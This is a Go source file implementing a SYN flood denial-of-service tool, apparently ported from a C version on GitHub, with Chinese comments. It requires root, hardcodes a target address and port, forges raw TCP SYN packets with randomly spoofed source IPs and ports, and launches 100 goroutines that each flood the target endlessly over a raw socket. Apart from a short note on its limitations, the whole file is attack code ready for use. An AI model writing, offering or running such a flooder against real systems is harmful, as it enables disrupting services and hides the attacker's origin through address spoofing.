package main

import (
	"crypto/rand"
	"fmt"
	"os"
	"os/user"
	"reflect"
	"strconv"
	"strings"
	"syscall"
)

/*

	c实现版本:  https://github.com/liexusong/synflood/blob/main/synflood.c


	缺陷:
		1. ip是伪造的，但是 mac地址没有被伪造
		2. 此攻击可能仅适用于易受多个半开放连接（SYN_RECV）影响的web服务器。


*/

func exitErr(reason error) {
	fmt.Println(reason)
	os.Exit(1)
}

func main() {
	username, err := user.Current()
	if err != nil || username.Name != "root" {
		exitErr(fmt.Errorf("没有root权限运行"))
	}

	target := "10.0.40.3"
	tport := 8080
	var packet = &TCPIP{}
	defer func() {
		if err := recover(); err != nil {
			exitErr(fmt.Errorf("error: %v", err))
		}
	}()

	// 初始化包
	packet.setTarget(target, uint16(tport))
	packet.genIP()
	packet.setPacket() // 发送包

	for i := 0; i < 100; i++ {

		// 循环发送包
		go packet.FloodTarget(
			reflect.TypeOf(packet).Elem(),
			reflect.ValueOf(packet).Elem(),
		)

	}

	select {}

}

// SYNPacket represents a TCP packet.
type SYNPacket struct {
	Payload   []byte
	TCPLength uint16
	Adapter   string
}

// 随机一个 0~255 的 byte 构造 ip
func (s *SYNPacket) randByte() byte {
	randomUINT8 := make([]byte, 1)
	rand.Read(randomUINT8)
	return randomUINT8[0]
}

func (s *SYNPacket) invalidFirstOctet(val byte) bool {
	return val == 0x7F || val == 0xC0 || val == 0xA9 || val == 0xAC
}

func (s *SYNPacket) leftshiftor(lval uint8, rval uint8) uint32 {
	return (uint32)(((uint32)(lval) << 8) | (uint32)(rval))
}

// TCPIP represents the IP header and TCP segment in a TCP packet.
type TCPIP struct {
	VersionIHL    byte
	TOS           byte
	TotalLen      uint16
	ID            uint16
	FlagsFrag     uint16
	TTL           byte
	Protocol      byte
	IPChecksum    uint16
	SRC           []byte
	DST           []byte
	SrcPort       uint16
	DstPort       uint16
	Sequence      []byte
	AckNo         []byte
	Offset        uint16
	Window        uint16
	TCPChecksum   uint16
	UrgentPointer uint16
	Options       []byte
	SYNPacket     `key:"SYNPacket"`
}

func (tcp *TCPIP) calcTCPChecksum() {
	var checksum uint32 = 0
	checksum = tcp.leftshiftor(tcp.SRC[0], tcp.SRC[1]) +
		tcp.leftshiftor(tcp.SRC[2], tcp.SRC[3])
	checksum += tcp.leftshiftor(tcp.DST[0], tcp.DST[1]) +
		tcp.leftshiftor(tcp.DST[2], tcp.DST[3])
	checksum += uint32(tcp.SrcPort)
	checksum += uint32(tcp.DstPort)
	checksum += uint32(tcp.Protocol)
	checksum += uint32(tcp.TCPLength)
	checksum += uint32(tcp.Offset)
	checksum += uint32(tcp.Window)

	carryOver := checksum >> 16
	tcp.TCPChecksum = 0xFFFF - (uint16)((checksum<<4)>>4+carryOver)

}

func (tcp *TCPIP) setPacket() {
	tcp.TCPLength = 0x0028
	tcp.VersionIHL = 0x45
	tcp.TOS = 0x00
	tcp.TotalLen = 0x003C
	tcp.ID = 0x0000
	tcp.FlagsFrag = 0x0000
	tcp.TTL = 0x40      // ttl 40
	tcp.Protocol = 0x06 // tcp
	tcp.IPChecksum = 0x0000
	tcp.Sequence = make([]byte, 4)
	tcp.AckNo = tcp.Sequence
	tcp.Offset = 0xA002
	tcp.Window = 0xFAF0
	tcp.UrgentPointer = 0x0000
	tcp.Options = make([]byte, 20)
	tcp.calcTCPChecksum()
}

func (tcp *TCPIP) setTarget(ipAddr string, port uint16) {
	for _, octet := range strings.Split(ipAddr, ".") {
		val, _ := strconv.Atoi(octet)
		tcp.DST = append(tcp.DST, (uint8)(val))
	}
	tcp.DstPort = port
}

func (tcp *TCPIP) genIP() {
	firstOct := tcp.randByte()
	for tcp.invalidFirstOctet(firstOct) {
		firstOct = tcp.randByte()
	}

	// 构造ip
	tcp.SRC = []byte{firstOct, tcp.randByte(), tcp.randByte(), tcp.randByte()}
	// 构造端口
	tcp.SrcPort = (uint16)(((uint16)(tcp.randByte()) << 8) | (uint16)(tcp.randByte()))
	for tcp.SrcPort <= 0x03FF {
		tcp.SrcPort = (uint16)(((uint16)(tcp.randByte()) << 8) | (uint16)(tcp.randByte()))
	}
}

// raw Sendto 发送 数据包
func (tcp *TCPIP) rawSocket(descriptor int, sockaddr syscall.SockaddrInet4) {
	err := syscall.Sendto(descriptor, tcp.Payload, 0, &sockaddr)
	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Printf(
			"Socket used:  %d.%d.%d.%d:%d\n",
			tcp.SRC[0], tcp.SRC[1], tcp.SRC[2], tcp.SRC[3], tcp.SrcPort,
		)
	}
}

// 创建 raw fd
func (tcp *TCPIP) FloodTarget(rType reflect.Type, rVal reflect.Value) {

	var dest [4]byte
	copy(dest[:], tcp.DST[:4])
	fd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	err := syscall.BindToDevice(fd, tcp.Adapter)
	if err != nil {
		panic(fmt.Errorf("bind to adapter %s failed: %v", tcp.Adapter, err))
	}

	addr := syscall.SockaddrInet4{
		Port: int(tcp.DstPort),
		Addr: dest,
	}

	for {
		tcp.genIP()
		tcp.calcTCPChecksum()
		tcp.buildPayload(rType, rVal)
		tcp.rawSocket(fd, addr)
	}
}

func (tcp *TCPIP) buildPayload(t reflect.Type, v reflect.Value) {
	tcp.Payload = make([]byte, 60)
	var payloadIndex int = 0
	for i := 0; i < t.NumField(); i++ {
		field := t.Field(i)
		alias, _ := field.Tag.Lookup("key")
		if len(alias) < 1 {
			key := v.Field(i).Interface()
			keyType := reflect.TypeOf(key).Kind()
			switch keyType {
			case reflect.Uint8:
				tcp.Payload[payloadIndex] = key.(uint8)
				payloadIndex++
			case reflect.Uint16:
				tcp.Payload[payloadIndex] = (uint8)(key.(uint16) >> 8)
				payloadIndex++
				tcp.Payload[payloadIndex] = (uint8)(key.(uint16) & 0x00FF)
				payloadIndex++
			default:
				for _, element := range key.([]uint8) {
					tcp.Payload[payloadIndex] = element
					payloadIndex++
				}
			}
		}
	}
}
